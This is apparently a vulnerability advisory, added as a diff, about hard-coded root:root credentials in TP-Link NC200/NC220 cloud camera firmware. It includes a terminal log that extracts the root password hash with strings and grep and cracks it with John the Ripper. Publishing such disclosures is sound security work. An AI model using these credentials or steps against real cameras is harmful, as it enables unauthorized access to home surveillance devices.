@@ -1,0 +1,51 @@
+TP-Link NC200/NC220 Cloud Camera 300Mbps Wi-Fi Hard-Coded Credentials
+Vendor: TP-LINK Technologies Co., Ltd.
+Product web page: http://www.tp-link.us
+Affected version: NC220 V1 1.0.28 Build 150629 Rel.22346
+                  NC200 V1 2.0.15 Build 150701 Rel.20962
+
+Summary: Designed with simplicity in mind, TP-LINK's Cloud Cameras are a
+fast and trouble free way to keep track on what's going on in and around
+your home. Video monitoring, recording and sharing has never been easier
+with the use of TP-LINK’s Cloud service. The excitement of possibilities
+never end.
+
+Desc: NC220 and NC200 utilizes hard-coded credentials within its Linux
+distribution image. These sets of credentials (root:root) are never exposed
+to the end-user and cannot be changed through any normal operation of the
+camera.
+
+Tested on: Linux
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5255
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5255.php
+
+
+20.07.2015
+
+--
+
+
+Initializing...
+root@zslab:~# strings NC220_1.0.28_Build_150629_Rel.22346.bin |grep root
+root_uImage
+p2048_newroot.cer
+root:$1$gt7/dy0B$6hipR95uckYG1cQPXJB.H.:0:0:Linux User,,,:/home/root:bin/sh
+Nproot:x:0:
+root@zslab:~# strings NC220_1.0.28_Build_150629_Rel.22346.bin | grep home > crack.me
+root@zslab:~# john crack.me
+Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 12x])
+root             (root)
+guesses: 1  time: 0:00:00:00 DONE (Mon Aug  3 05:52:55 2015)  c/s: 400  trying:
+root - Userroot
+Use the "--show" option to display all of the cracked passwords reliably
+root@zslab:~# john crack.me --show
+root:root:0:0:Linux User,,,:/home/root:/bin/sh
+
+1 password hash cracked, 0 left
+root@zslab:~#
